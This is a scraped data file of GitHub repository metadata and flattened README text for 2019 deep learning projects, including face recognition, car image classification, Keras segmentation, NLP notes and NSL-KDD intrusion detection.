DaneyAlex5,Webcam-based-Face-Recognition-using-Deep-Learning-,face-detection#face-recognition#facenet#live-face-recognition#mtcnn#tensorflow,Webcam based Face Recognition using Deep Learning Face Detection and landmark detection It is done using Multi task Cascaded Convolutional Networks MTCNN model Used a pretrained model of MTCNN to detect face to find the bounding box and landmark detection Reference https arxiv org pdf 1604 02878 pdf Face Recognition The face Recognition is done using Facenet model Used a pretrained facenet model to compare the captured image Input image with all images in database to recognize the correct face using clustering algorithm Reference https arxiv org pdf 1503 03832 pdf 1 MTCNN Pretrained Model Follow link https github com ipazc mtcnn 2 FaceNet Pretrained Model https drive google com file d 0B5MzpY9kBtDVZ2RpVDYwWmxoSUk Dependency 1 Python 3 6 2 tensorflow r1 12 or above 3 OpenCV 4 1 1 or above How to Run the Code 1 Download and extract the folder FaceRecognition zip into a folder 2 Download the pretrained model from the link given and place the files in the extracted folder in step 1 3 Create or Update the database by inserting images of the people among among which face recognition is to be done After inserting all images select all images and rename the images as Person example Person1 Person2 etc Your database can be of any size but speed of the code depends on size of database 4 Update the xls sheet with Person number and name of corresponding person 5 Now execute the FaceRec py script Execution and Outputs 1 The user can use either image captured throuh webcam automatically or the image from Input folder The user can choose method of input during execution 2 After executing the program name of the person is displayed if the input is a person from the database 3 The image captured can be seen inside captured folder 4 The detected face with bounding box cropped part of image and land mark detected images can be seen inside folder check Note 1 Use the port number for the webcam according to Device Configration of your sytem Edit FaceRec py Line 14 camera cv2 VideoCapture 0 2 Use webcam with resolution greater than 640x480 for better accuracy,2019-08-21T07:47:08Z,2019-08-21T10:04:29Z,Python,DaneyAlex5,User,1,1,0,29,master,DaneyAlex5,1,0,0,0,0,0,0
YasirHabib,Deep-Learning-Convolutional-Neural-Networks-in-Python,n/a,Deep Learning Convolutional Neural Networks in Python,2019-08-14T18:34:51Z,2019-09-10T18:35:54Z,Jupyter Notebook,YasirHabib,User,1,1,0,20,master,YasirHabib,1,0,0,0,0,0,0
briandi26,Deep-Learning-for-Air-Quality-Prediction,air-quality#deep-learning#lstm-neural-network#time-series-forecasting#weather,,2019-09-09T04:20:50Z,2019-09-09T04:32:20Z,Jupyter Notebook,briandi26,User,1,1,0,3,master,briandi26,1,0,0,0,0,0,0
OFRIN,Tensorflow_Learning_Deep_Features_for_Discriminative_Localization,n/a,TensorflowLearningDeepFeaturesforDiscriminativeLocalization VGG16 Weakly Supervised Learning Results Test Samples result results 738207467fc59cfcd9bz jpg result results 9029297232de50698e2fn jpg result results 63237210683d3394af6dn jpg result results 8120563761ed5620664fm jpg Device GTX 1050 Test Requirements Tensorflow 1 13 1 OpenCV 4 0 0 Numpy 1 16 4,2019-08-18T11:18:04Z,2019-11-06T11:28:58Z,Python,OFRIN,User,1,1,0,1,master,OFRIN,1,0,0,0,0,0,0
bricdu,The_easiest_way-to_learn_deep_learning,n/a,,2019-08-28T04:11:56Z,2019-09-03T12:58:24Z,HTML,bricdu,User,1,1,0,3,master,bricdu,1,0,0,0,0,0,0
baiyang2464,Natural-Language-Processing-with-Deep-Learning,n/a,,2019-09-03T04:38:37Z,2019-09-16T01:40:14Z,n/a,baiyang2464,User,1,1,0,15,master,baiyang2464,1,0,0,0,0,0,0
Jchaochao,Georgetown-Course-Neural-Nets---Deep-Learning,n/a,README This is the first homework for GU ANLY 590 In this homework I tried to use Lasso and ridge to get familiar with regression task,2019-09-09T02:22:09Z,2019-12-14T01:37:29Z,Jupyter Notebook,Jchaochao,User,2,1,0,8,master,Jchaochao,1,0,0,0,0,0,0
jeroenvansaane,Deep-Learning-Based-Intrusion-Detection-NSL-KDD,n/a,Deep Learning based Intrusion Detection on NSL KDD The presented model is a neural network solution built with Kerass Sequential API and contains two experimental models The model is benchmarked with the NSL KDD dataset improved version of the KDD CUP 99 dataset Tools Anaconda Python 3 6 Jupyter Notebook Prerequisites Keras Sklearn Pandas Numpy Running the Application Run inside jupyter notebook after installing required libraries Experimental Results Classification report that contains accuracy per class attack category available on request License This project is licensed under the MIT License see the LICENSE md file for details,2019-08-17T20:22:51Z,2019-08-24T20:17:40Z,Jupyter Notebook,jeroenvansaane,User,1,1,0,3,master,jeroenvansaane,1,0,0,0,0,0,0
striver13,Deep-Learning-with-TensorFlow2-book,n/a,Deep Learning with TensorFlow2 book TensorFlow TensorFlow 2 1 3 png 5 7 png 10 png 7 23 8 9 Issues liangqu long gmail com res outline jpg,2019-08-14T09:34:10Z,2019-10-05T12:52:20Z,n/a,striver13,User,0,1,0,13,master,dragen1860,1,0,0,0,0,0,0
Nitinguptadu,Keras---Python-Deep-Learning-Neural-Network-API,n/a,Keras Python Deep Learning Neural Network API This series will teach you how to use Keras a neural network API written in Python Each video focuses on a specific concept and shows how the full implementation is done in code using Keras and Python We will learn how to preprocess data organize data for training validation and testing build an artificial neural network from scratch train an artificial neural network build a convolutional neural network CNN and much more,2019-08-28T13:12:50Z,2019-09-08T06:49:49Z,Jupyter Notebook,Nitinguptadu,User,1,1,0,5,master,Nitinguptadu,1,0,0,0,0,0,0
Etrama,Deep_Learning_Goodfellow_et_al_Notes,n/a,DeepLearningGoodfellowetalNotes My notes on the Deep Learning book Reference bookGoodfellow 2016 DL 3086952 author Goodfellow Ian and Bengio Yoshua and Courville Aaron title Deep Learning year 2016 isbn 0262035618 9780262035613 publisher The MIT Press Few Pointers A lot of the Images don t work anymore in Linear Algebra Part 1 and Part 2 I was using MathPix to get the images didn t know they used a freemium model Need to update these This also indicates a need to simplify The equations take a lot of time to write to in LaTeX without software like MathPix Let s try our best using code,2019-09-16T18:43:04Z,2019-10-08T00:38:38Z,Jupyter Notebook,Etrama,User,1,1,0,15,master,Etrama,1,0,0,0,0,0,0
ajayrawatsap,Identify-a-Car-Model-with-Deep-Learning,n/a,Identify a Car Model with Deep Learning Explore how to practice real world Data Science by collecting data curating it and apply advanced Deep Learning techniques to create high quality models which can be deployed in production Use Keras and Pytorch libraries in python for applying advanced techniques like data augmentation drop out batch normalization and transfer learning Index Data data Big Picture big picture Pre Requisites Resources and Acknowledgments pre requisites resources and acknowledgments A note on the motivation and challenges a note on the motivation and challenges Training a base CNN model training a base cnn model Training in Keras training in keras Keras Training and Validations Results keras training and validations results Keras source code keras source code Training in Pytorch training in pytorch Pytorch Training and Validations Results pytorch training and validations results Pytorch source code pytorch source code Using Data Augmentation using data augmentation Data Augmentation in Keras data augmentation in keras Data Augmentation Results in Keras data augmentation results in keras Data Augmentation source code in Keras data augmentation source code in keras Data Augmentation in Pytorch data augmentation in pytorch Data Augmentation Results in Pytorch data augmentation results in pytorch Data Augmentation source code in Pytorch data augmentation source code in pytorch Train with Dropout train with dropout Dropout in Keras dropout in keras Dropout Results with Keras dropout results with keras Dropout Source code in Keras dropout source code in keras Dropout in Pytorch dropout in pytorch Dropout Results with Pytorch dropout results with pytorch Dropout Source code in Pytorch dropout source code in pytorch Batch normalization batch normalization Batch Normalization in Keras batch normalization in keras Batch Normalization results in Keras batch normalization results in keras Batch Normalization source code in Keras batch normalization source code in keras Table of contents generated with markdown toc Data There are 4000 images of two of the popular cars Swift and Wagonr in India of make Maruti Suzuki with 2000 pictures belonging to each model class The data is divided into training set with 2400 images validation set with 800 images and test set with 800 images The data was randomized before splitting into training test and validation set Data was collected using a web scraper written in python Selenium library was used to load the full HTML page and Beautifulsoup library was used to extract and download images from HTML tags The data is hosted at Kaggle https www kaggle com ajaykgp12 cars wagonr swift which can be downloaded or you can also create a notebook directly on Kaggle and access data in your notebook dataimage https github com ajayrawatsap Identify a Car Model with Deep Learning blob master resources coverimage PNG Big Picture Data science beginners often start with curated set of data but it s a well known fact that in a real Data Science Projects major time is spent on collecting cleaning and organizing data Also domain expertise is considered as an important aspect of creating good ML models Being an automobile enthusiast I took up this challenge to collect images of two of the popular car models from a used car website where users upload the images of the car they want to sell and then train a Deep Neural Network to identify model of a car from car images In my search for images I found that approximately 10 percent of the car pictures did not represent the intended car correctly and those pictures must be deleted from final data We will explore all Major Deep Learning framework starting from Keras and moving on to Pytorch and TensorFlow 2 0 Keras is a high level deep learning framework and is very well suited for fast prototyping and is also recommended for beginners Pytorch is gaining popularity due to its use in Research and is considered pythonic it provides flexibility to experiment with different Neural Network Architectures TensorFlow 2 0 is a revamp of old TensorFlow 1 xxx version which was not very user friendly with steep learning curve static graphs and lots of boilerplate code to get things done TensorFlow 2 0 solves this problem by adopting ideas from Keras and Pytorch TensorFlow is most suited to deployment in production with support to multiple production environments As we are dealing with Images we will be focusing on Convolutional Neural Networks CNNs ConvNets and start with simple CNN Model and train it from scratch We will then move on to advance techniques like Data Augmentation Dropout Batch Normalization and Transfer Learning using Pre Trained networks like VGG16 trained on ImageNet As we progress in our journey we will also explore some key aspects below which are important for any Data Science Project 1 How much data is enough to get reliable results from Deep Neural Networks and is more data is always good 2 How do I deal with Bias and Variance tradeoff and how to select best model which can generalize better without sacrificing too much of performance 3 For image recognition tasks what works best custom CNN model or a Pre Trained network 4 What strategy to choose to validate the model performance Hint Trust your validation score and do not touch test set till end 5 What Deep Learning Framework to choose and which one is best suitable for the task There are no straightforward answers to some of the questions and it depends on context and the type of problem or data that we are dealing with and it will be my endeavor to answers some of the difficult questions with experimentation and analysis Pre Requisites Resources and Acknowledgments It is assumed that you have some experience in Python and basic deep learning concepts Many of the ideas presented here are based on book Deep Learning with Python https www amazon com Deep Learning Python Francois Chollet dp 1617294438 written by Francois Chollet who also happens to be author of Keras library Another excellent resource to learn theoretical concepts around deep learning is Deep Learning Specialization https www coursera org specializations deep learning taught by Andrew Ng on Coursera Even though this is paid course the videos are freely available on YouTube Initially it was not easy to grasp the convolutions but thanks to Andrew Ng Convolution Neural Networks no longer appear to be convoluted The book focuses on the practical application while Andrew Ng gravitates towards theoretical concepts with easy to understand mathematics I have personally benefit from both and even though both differ in their approaches they complement each other well just like ensemble machine learning models Its recommended that that code be run on machine with GPU there are many ways to achieve it without owning a high end machine You can use Kaggle Notebook with GPU which is what I would be doing throughout the project Links to Kaggle Notebooks will be shared and it can be forked modified and results can be easily reproduced without any extra set up Another way is to use Google Colab or Google Cloud Platform with free credits of 300 USD A note on the motivation and challenges When I started with this project my goal was to achieve a reasonable performance with my image classification model with more focus on building a robust model which can generalize well on unseen data The data is user generated and images are taken by many users from all over India from different angles under different lighting conditions and using mobile devices with varying image quality This presents an interesting challenge and I am very much curious as well as anxious as to how things would turn out There are multiple stories on how some models which performed well during training failed to perform on new data that came from different distribution To make sure that our model is robust here are some techniques that we will apply 1 When gathering data I made sure that I downloaded car images from multiple regions like Delhi UP Maharashtra etc 2 Delete images which are not car incorrect model closeup images interior images Anything which a human cannot recognize most likely ML model probably cant recognize Interestingly one of the class of data is WagonR the model I owned for 7 years so it was easy for me to curate the data manually This is where domain experience comes in handy 3 The data is randomized and split into Training Set with 2400 images Validation Set with 800 images and test set with 800 images The model will be trained on training set fine tuned with feedback from validation data and test data will not evaluated until end when we have found our best model based on validation set This is important because the test set acts as unseen data which model will encounter in future and if it performs well on this data our model will perform well on unseen data To further challenge our model I have created another set of test data which was taken from different used car website and different city Hyderabad Hold on with your seat belts grab some popcorn and be ready for an exciting as well as thrilling ride this sure will be a long and interesting one Training a base CNN model The CNN model architecture is shown below modelarch https github com ajayrawatsap Identify a Car Model with Deep Learning blob master resources cnnarch PNG The images are converted to 150 X 150 X 3 shape and fed to CNN model The first CONVD layer performs convolution on the input image with 32 filters with filter size of 3 resulting in layer of dimension 148 X 148 X 32 which is then down sampled by a Max Pool layer of filter size 2 and stride of 2 resulting in layer of dimensions 74X74X32 We are using four CONVD layers each with filter size of 3 followed by a Max Pooling layer of filter size 2 and stride of 2 The output from last MAX pool layer is flattened and converted to dense layer of shape 512 X 1 The final output layer consists of a single layer with sigmoid activation function The other layers use Relu Activation Function You can notice that convolution operation increases the depth of the layer while keeping height and width almost same while max pool operation halves the height and width while keeping depth same There is very simple math behind it which is not in scope of this tutorial Andrew Ng explains this very well in his course Training in Keras The keras code for buliding model is shown below python def buildcnn displaysummary False model models Sequential model add layers Conv2D 32 3 3 activation relu inputshape 150 150 3 model add layers MaxPooling2D 2 2 model add layers Conv2D 64 3 3 activation relu model add layers MaxPooling2D 2 2 model add layers Conv2D 128 3 3 activation relu model add layers MaxPooling2D 2 2 model add layers Conv2D 128 3 3 activation relu model add layers MaxPooling2D 2 2 model add layers Flatten model add layers Dense 512 activation relu model add layers Dense 1 activation sigmoid model compile loss binarycrossentropy optimizer optimizers RMSprop lr 1e 4 metrics acc if displaysummary model summary return model Model summary Layer type Output Shape Param conv2d1 Conv2D None 148 148 32 896 maxpooling2d1 MaxPooling2 None 74 74 32 0 conv2d2 Conv2D None 72 72 64 18496 maxpooling2d2 MaxPooling2 None 36 36 64 0 conv2d3 Conv2D None 34 34 128 73856 maxpooling2d3 MaxPooling2 None 17 17 128 0 conv2d4 Conv2D None 15 15 128 147584 maxpooling2d4 MaxPooling2 None 7 7 128 0 flatten1 Flatten None 6272 0 dense1 Dense None 512 3211776 dense2 Dense None 1 513 Total params 3 453 121 Trainable params 3 453 121 Non trainable params 0 Keras Training and Validations Results The model was trained for 50 epochs on a Kaggle notebook with GPU and achived accuracy of 88 125 percent on validation set results https github com ajayrawatsap Identify a Car Model with Deep Learning blob master resources resultskerascnnbase PNG I had set a conservative target of 80 accuracy but it seems our baseline CNN model performed better than expected with 88 accuracy If you ask me if this a good accuracy and I might say its pretty good considering that a random classifier will be 50 accurate as there are equal number of samples of each class But how is the performance compared to a human and I will agree that humans will typically perform with 96 accuracy The benchmark is raised and our goal will be to achieve near human performance At this point we have no idea if we can achieve the target accuracy Ok the model is pretty good for a baseline model what about its robustness can it perform well on unseen data As we can see from the screenshot that the training accuracy is much higher than the validation accuracy throughout all epochs and now we are talking the bias and variance tradeoff The model is clearly showing classic symptoms of low bias since training accuracy is near 100 and high variance since validation accuracy is much lower at 88 or overfitting I would be not willing to put this model into production even if you think the accuracy is good enough As we will see there many ways to deal with this and we will explore it in next sections Keras source code github https github com ajayrawatsap Identify a Car Model with Deep Learning blob master keras carskerascnnbaseline ipynb kaggle https www kaggle com ajaykgp12 cars keras cnn scriptVersionId 20357823 Training in Pytorch The same model in pytorch can be written as shown below python class Net nn Module def init self super Net self init self conv1 nn Conv2d inchannels 3 outchannels 32 kernelsize 3 self pool nn MaxPool2d kernelsize 2 stride 2 self conv2 nn Conv2d inchannels 32 outchannels 64 kernelsize 3 self conv3 nn Conv2d inchannels 64 outchannels 128 kernelsize 3 self conv4 nn Conv2d inchannels 128 outchannels 128 kernelsize 3 128 128 7 is the output of the last max pool layer self fc1 nn Linear 128 7 7 512 self fc2 nn Linear 512 2 def forward self x x self pool F relu self conv1 x x self pool F relu self conv2 x x self pool F relu self conv3 x x self pool F relu self conv4 x this is similar to flatten in keras but keras is smart to figure out dimensions by iteself x x view 1 128 7 7 x F relu self fc1 x x self fc2 x The Pytorch model differs slightly as we have two output neurons instead of one in Keras This is fine because in this case we can imagine each neuron outputting result corresponding to each class The loss function CrossEntropyLoss https pytorch org docs stable nn html crossentropyloss used in Pytorch includes the SoftMax activation and there no need to activate the output neurons In Keras a single output neuron is activated by sigmoid activation function which is outputting probability of positive class Pytorch Training and Validations Results kerascnnbaseresults https github com ajayrawatsap Identify a Car Model with Deep Learning blob master resources resultspytorchcnnbase PNG It was little time consuming to re write the same model in Pytorch as it does not have Keras like fit method to train as well as evaluate ,2019-09-12T13:55:24Z,2019-11-08T14:38:22Z,Jupyter Notebook,ajayrawatsap,User,1,1,0,150,master,ajayrawatsap,1,0,0,0,0,0,0
amitdu6ey,Stanford-Cars-Image-Classification-using-Deep-Learning,deep-learning#fastai#resnet-50#stanford-cars,Stanford Cars Image Classification using Deep Learning I am currently working on this project and best so far I got 84 2 accuracy using ResNet50 with PyTorch FastAI library This project helped me to understand following things while experimenting around them 1 fitonecycle based on Leslie Smith s 1 cycle policy helps in getting better results than fit method 2 Differential Learning Rates i e lower for initial layers and relatively higher for final layers give better results than Constant Learning Rate Target To improve accuracy of ResNet50 CNN to 90 Exposure Python FastAI PyTorch Jupyter Notebook CNNs ResNet34 ResNet50 architectures,2019-08-24T20:26:25Z,2019-08-24T21:50:13Z,Jupyter Notebook,amitdu6ey,User,1,1,0,10,master,amitdu6ey,1,0,0,0,0,0,0
asraman9792,Deep-Learning-based-Semantic-Segmentation-using-Keras,n/a,Image Segmentation Keras Implementation of Segnet FCN UNet PSPNet and other models in Keras Implementation of various Deep Image Segmentation models in keras Link to the full blog post with tutorial https divamgupta com image segmentation 2019 06 06 deep learning semantic segmentation keras html Our Other Repositories Attention based Language Translation in Keras https github com divamgupta attention translation keras Ladder Network in Keras https github com divamgupta laddernetworkkeras model achives 98 test accuracy on MNIST with just 100 labeled examples Contributors Divam Gupta https divamgupta com Models Following models are supported modelname Base Model Segmentation Model fcn8 Vanilla CNN FCN8 fcn32 Vanilla CNN FCN8 fcn8vgg VGG 16 FCN8 fcn32vgg VGG 16 FCN32 fcn8resnet50 Resnet 50 FCN32 fcn32resnet50 Resnet 50 FCN32 fcn8mobilenet MobileNet FCN32 fcn32mobilenet MobileNet FCN32 pspnet Vanilla CNN PSPNet vggpspnet VGG 16 PSPNet resnet50pspnet Resnet 50 PSPNet unetmini Vanilla Mini CNN U Net unet Vanilla CNN U Net vggunet VGG 16 U Net resnet50unet Resnet 50 U Net mobilenetunet MobileNet U Net segnet Vanilla CNN Segnet vggsegnet VGG 16 Segnet resnet50segnet Resnet 50 Segnet mobilenetsegnet MobileNet Segnet Example results for the pre trained models provided Input Image Output Segmentation Image sampleimages 1input jpg sampleimages 1output png sampleimages 3input jpg sampleimages 3output png Getting Started Prerequisites Keras 2 0 opencv for python Theano Tensorflow CNTK shell sudo apt get install python opencv sudo pip install upgrade keras Installing Install the module shell pip install keras segmentation or shell git clone https github com divamgupta image segmentation keras cd image segmentation keras python setup py install pip install will be available soon Pre trained models python import kerassegmentation model kerassegmentation pretrained pspnet50ADE20K load the pretrained model trained on ADE20k dataset model kerassegmentation pretrained pspnet101cityscapes load the pretrained model trained on Cityscapes dataset model kerassegmentation pretrained pspnet101voc12 load the pretrained model trained on Pascal VOC 2012 dataset load any of the 3 pretrained models out model predictsegmentation inp inputimage jpg outfname out png Preparing the data for training You need to make two folders Images Folder For all the training images Annotations Folder For the corresponding ground truth segmentation images The filenames of the annotation images should be same as the filenames of the RGB images The size of the annotation image for the corresponding RGB image should be same For each pixel in the RGB image the class label of that pixel in the annotation image would be the value of the blue pixel Example code to generate annotation images python import cv2 import numpy as np annimg np zeros 30 30 3 astype uint8 annimg 3 4 1 this would set the label of pixel 3 4 as 1 cv2 imwrite ann1 png annimg Only use bmp or png format for the annotation images Download the sample prepared dataset Download and extract the following https drive google com file d 0B0d9ZiqAgFkiOHR1NTJhWVJMNEU view usp sharing You will get a folder named dataset1 Using the python module You can import kerassegmentation in your python script and use the API python import kerassegmentation model kerassegmentation models unet vggunet nclasses 51 inputheight 416 inputwidth 608 model train trainimages dataset1 imagespreppedtrain trainannotations dataset1 annotationspreppedtrain checkpointspath tmp vggunet1 epochs 5 out model predictsegmentation inp dataset1 imagespreppedtest 0016E507965 png outfname tmp out png import matplotlib pyplot as plt plt imshow out Usage via command line You can also use the tool just using command line Visualizing the prepared data You can also visualize your prepared annotations for verification of the prepared data shell python m kerassegmentation verifydataset imagespath dataset1 imagespreppedtrain segspath dataset1 annotationspreppedtrain nclasses 50 shell python m kerassegmentation visualizedataset imagespath dataset1 imagespreppedtrain segspath dataset1 annotationspreppedtrain nclasses 50 Training the Model To train the model run the following command shell python m kerassegmentation train checkpointspath pathtocheckpoints trainimages dataset1 imagespreppedtrain trainannotations dataset1 annotationspreppedtrain valimages dataset1 imagespreppedtest valannotations dataset1 annotationspreppedtest nclasses 50 inputheight 320 inputwidth 640 modelname vggunet Choose modelname from the table above Getting the predictions To get the predictions of a trained model shell python m kerassegmentation predict checkpointspath pathtocheckpoints inputpath dataset1 imagespreppedtest outputpath pathtopredictions Fine tuning from existing segmentation model The following example shows how to fine tune a model with 10 classes python import kerassegmentation from kerassegmentation models modelutils import transferweights pretrainedmodel kerassegmentation pretrained pspnet50ADE20K newmodel kerassegmentation models pspnet pspnet50 nclasses 51 transferweights pretrainedmodel newmodel transfer weights from pre trained model to your model newmodel train trainimages dataset1 imagespreppedtrain trainannotations dataset1 annotationspreppedtrain checkpointspath tmp vggunet1 epochs 5,2019-08-25T09:44:03Z,2019-10-04T15:17:47Z,Python,asraman9792,User,1,1,0,19,master,asraman9792,1,0,0,0,0,0,0
zahangircse,ece595_dl,n/a,Title Deep Learning DL Course No ECE 595DL Here I am providing codes for the individual lecture The DL class will conver the topic including 1 Multilayer perceptron neural network MLP 2 Convolutional Neural Networks CNN 3 Recurrent Neural Networks RNN 4 Deep Belief Networks DBN 5 Auto Encoder AE and its variants 6 Generative adversarial networks GAN 6 Reinforcement Learning RL and so on,2019-09-18T20:46:35Z,2019-11-20T20:40:52Z,Jupyter Notebook,zahangircse,User,1,1,0,20,master,zahangircse,1,0,0,0,0,0,0
A2Amir,Natural-Language-Processing-with-Deep-Learning,n/a,Natural Language Processing with Deep Learning Your Text NLP deals with the use of human languages by a computer GBC16 p 461 It has many different applications which all refer to humans unstructured natural language For example its application areas are machine translation speech recognition dialog systems named entity recognition information retrieval and text classification Thus the domain of NLP encompasses all interactions between a computer and a human by the use of written or spoken natural language The difficulties of NLP consist of all components of natural language such as Phonology This is the study of how speech sounds function and are organised in a particular natural language phonetics analyses the physical production of speech independent of language Morphology The smallest meaningful unit in the grammar of a language is called a morpheme This level then performs morphological decomposition of words into roots and affixes to infer their internal structure Syntax This level infers the grammatical structure of the sentence that is the structural dependencies among the constituent words It includes the tagging of the words with Part of Speech POS categories for example noun verb and preposition The word POS tag sequences grouped with constituent parsing into phrases such as noun phrases headed by a noun verb phrases headed by averb and prepositional phrases headed by a preposition Semantics This is the study of meaning of linguistic expressions More narrowly defined it is the study of word sense on the sentence level not yet considering discourse and pragmaticfactors explanations to follow At this level the meaning of the remaining ambiguous words from the lexical stage are resolved by considering the interactions among the individual word senses in the sentence which called word sense disambiguation Discourse This level of analysis functions on the whole document or discourse connecting meaning for example POS number agreement gender et cetera across sentences Coreference resolutionis a technique that automatically tracks all the mentions of a particular discourse entity in a discourse and stores them in an indexed coreference chain like below Michael is a boy He likes the girl She is pretty two coreference chains are formed Michael a boy He Pragmatics This is the study of meaning in context over and above that which can be captured by the text for example the intent plan and or goal of the speaker the status of the parties involved and other world knowledge Pragmatics is in this way an explanation of how humans are able to overcomethe inherent ambiguity in natural language sentences Lexicology Lexical analysis determines the underlying meaning or sense of individual words typically bylookup in a dictionary called a lexicon As you can see all of these components domain knowledge discourse knowledge word knowledge must be taken into account in order to gain complete understanding of a message Deep Learning for natural language porocessning is pattern recognition applied to words sentences and paragraphs in much the same way that computer vision is pattern recognition applied to pixels Applications of NLP Document classification such as identifying the topic of an article ot the author of a book Sequence to sequence learning such as machine translation Sentiment analysis Image Captioning Visual question answering question answering example https books google com talktobooks Text Preprocessing in NLP Feature selection and preprocessing are significant tasks in Deep Learning also in NLP this task does have tremendous impact on the success of text analysis This is mostly caused by the unstructured and arbitrary nature of text data Furthermore machines need structure and numerical data A couple of approaches for this transformation task e g word embeddings or the vector space model exist This sections scope lies on the theoretical foundation of different preprocessing and feature selection techniques Vectorization Deep learning model don t take as input raw text they only work with numeric tensors thefor we need to tranform texts into numeric tensors which called Vectorization Notice Text can be defined as sequences of charachters or sequences of words most common Vectorization way 1 Segement text into word and transform each word into a vector 2 Segement text into characters and transform characters into a vector 3 Extract n grams of words or characters and transfor each n gram into a vector N gram overlapping groups of multiple consecutive words or charachters and extracting n gram is a form of feature engineering and deep learning does away with this kind of girid brittle approach Bag of Word you are dealing with a set of words rather than a list or sequence In simple terms its a collection of words to represent a sentence with word count and mostly disregarding the order in which they appear it tends to be used in shallow language processing model rather than in deep learning Bag of Word Algorithm https www freecodecamp org news an introduction to bag of words and how to code it in python for nlp 282e87a9da04 Stop Word Removal A very important approach to reduce the huge raw input space in NLP is stop word removal swr Most languages have specific words which do appear more often than others or donot include much information about the content of the text e g auxiliary verbs or articles Due to this it often makes sense to exclude this so called stop words in further analysis after tokenization In English such words could be the a or an and for German typical stopwords are the articles der die and das The elimination could be done by checkingthe words against a standardized stop word list Stemming Besides stop word elimination stemming is a useful technique to map words to their word stems and further reduce the input dimension This helps to extract the real meaning of a text and makes the unstructured data better accessible for a machine The porter stemming algorithm is a state of the art approach and strips sufixes from words to retain the word stem It performs well in English there are some drawbacks for other languages Lemmatization is the process of mapping every word in a text to their dictionary type or intended originating structure Verbs are transformed to their infinite form a noun is reconstructed to its singular representation and adverbs or adjectives anticipate their positive format The method is based on morphological analysis and often usesa dictionary There are two ways that can transform a token into a vector 1 One hot Encoding A one hot encoding is a representation of categorical variables as binary vectors Each integer value is represented as a binary vector that is all zero values except the index of the integer which is marked with a 1 Example implementation of One hot encoding is shown below Code https github com A2Amir Natural Language Processing with Deep Learning blob master One 20Hot 20Encoding 20 NLP ipynb We only take into account the N msot common word in the dataset to avoisd dealing with verly large input vector spcae It can be done at both word level and character level The shape of a one hot encoded vectorization of a list of M documen where we only consider the first K words of each sentence is M K N The vectors obtained through one hot encoding are binary sparse mostly made of zeros and very high dimensional same dimensionality as the number of words in the vocabulary which make this approach inefficient when the number of words in our vocabulary to much is 2 Distributed representations word embeddings Another popular and powerful way to associate a vector with a token word is the use of dense word vectors also called distributed representations The distributed representations we build will always be vectors of real numbers The models are often called vector space models VSMs If a neural network is used to train the representations then they might be called neural representations The term word embedding is also used for distributed representations including distributional ones This term is a reminder that vector representations are meaningful only when embedded in and compared with others in a unified space usually a matrix of representations of the same type In other words word embeddings are low dimensional floating point vectors i e dense vectors as opposed to sparse vectors in one hot encoding Unlike word vectors obtained via one hot encoding word embeddings are learned from data It is common to see word embeddings that are 256 dimensional 512 dimensional or 1024 dimensional when dealing with very large vocabularies The idea of a Dense low dimensional embedding space for words computed in an unsupervised way was initially explored in the early 2000s Yoshua Bengio et al Neural Probablistic Language Models springer but it only started to take off in research and industry application after the release of the Word2Vec algorithm developed by Tomas Mikolov at Google in 2013 Differencies between Word Embeddding and One hot Encoding word embeddings pack more information into far fewer dimensions There are two ways to obtain word embeddings 1 Learn word embeddings jointly with the main task you care about e g document classification or sentiment prediction In this setup you would start with random word vectors then learn your word vectors in the same way that you learn the weights of a neural network 2 Load into your model word embeddings that were pre computed using a different machine learning task than the one you are trying to solve These are called pre trained word embeddings When you have enough data avaliable you can use the embedding layer to train but when your data is not enough you can use the pretrained embedding layer 1 Learn word embeddings jointly with the main task you care about The simplest way to associate a dense vector to a word would be to pick the vector at random The problem with this approach is that the resulting embedding space would have no structure for instance the words accurate and exact may end up with completely different embeddings even though they are interchangeable in most sentences It would be very difficult for a deep neural network to make sense of such a noisy unstructured embedding space Word embeddings are meant to map human language into a geometric space For instance in a reasonable embedding space we would expect synonyms to be embedded into similar word vectors words meaning very different things would be embedded to points far away from each other while related words would be closer and even beyond mere distance we may want specific directions in the embedding space to be meaningful As an important point word embedding is able to model the similarity between words Model Similarity https github com A2Amir Wordanalogy using embeddings blob master README md A question that occurs is Is there some ideal word embedding space that would perfectly map human language and could be used for any natural language processing task Possibly but in any case we have yet to compute anything of the sort Also there isn t such a thing as human language there are many different languages and they are not isomorphic as a language is the reflection of a specific culture and a specific context what makes a good word embedding space depends heavily on your task the perfect word embedding space for an English language movie review sentiment analysis model may look very different from the perfect embedding space for an English language legal document classification model because the importance of certain semantic relationships varies from task to task It is thus reasonable to learn a new embedding space with every new task thankfully backpropagation makes this really easy and Keras makes it even easier It s just about learning the weights of a layer the Embedding layer 2 Load into your model word embeddings that were pre computed There are various pre computed databases of word embeddings that can download and start using in a Keras Embedding layer Word2Vec is one of them Another popular one is called GloVe developed by Stanford researchers in 2014 It stands for Global Vectors for Word Representation and it is an embedding technique based on factorizing a matrix of word co occurrence statistics Its developers have made available pre computed embeddings for millions of English tokens obtained from Wikipedia data or from Common Crawl data Understanding Recurrent Neural Networks and LSTMs Long Short Term Memory As you read a sentence you don t process it in one go instead you process it word by word while keeping memories of what came befor Biological Intelligence processes information incrementally while maintaining an internal state of what it s processing built from past information and constantly updated as new information comes in 1D Convolutional Layers A CNN works well for identifying simple patterns within your data which will then be used to form more complex patterns within higher layers A 1D CNN is very effective when you expect to derive interesting features from shorter fixed length segments of the overall data set and where the location of the feature within the segment is not of high relevance 1D Convolutional Layer applies well to the analysis of time sequences of sensor data such as gyroscope or accelerometer data It also applies to the analysis of any kind of signal data over a fixed length period such as audio signals Another application is NLP although here LSTM networks are more promising since the proximity of words might not always be a good indicator for a trainable pattern you can find all related codes here https github com A2Amir Natural Language Processing with Deep Learning blob master Using word embeddings with 20Dense 20and 20RNN 20and 20LSTM 20layers ipynb,2019-09-02T12:26:37Z,2019-09-16T16:06:08Z,Jupyter Notebook,A2Amir,User,1,1,0,145,master,A2Amir,1,0,0,0,0,0,0
Murtuza-Chawala,Face-Detection-using-Deep-Learning-and-Python,n/a,Face Detection using Deep Learning and Python Detect faces with a very hig accuracy using OpenCV built in deep learning face detector with Python The detected faces Screenshot 20from 202019 09 15 2012 51 51 png Picture taken from a low Mega pixel camera still returns a very high accuracy,2019-09-15T07:24:25Z,2019-09-22T11:09:04Z,Jupyter Notebook,Murtuza-Chawala,User,1,1,0,6,master,Murtuza-Chawala,1,0,0,0,0,0,0
